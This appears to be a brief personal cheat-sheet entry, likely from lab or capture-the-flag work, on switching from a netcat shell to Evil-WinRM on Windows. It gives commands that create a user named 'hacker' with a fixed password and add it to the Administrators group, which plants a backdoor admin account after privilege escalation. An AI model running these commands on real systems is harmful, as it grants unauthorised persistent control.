# Changing from a NC session to Evil-WinRM
- This was useful when I priv esc from a user while utilizing Evil-WinRM, and went from that tool to a nc session. However I wanted to log into Administrator while in Win-RM, so i just upgraded a user to administrators group to accomidate this.
## Create User or use Known user

```bash
# In your nc shell
net user hacker Password123! /add
net localgroup Administrators hacker /add

# Or just upgrade a known user
```

## 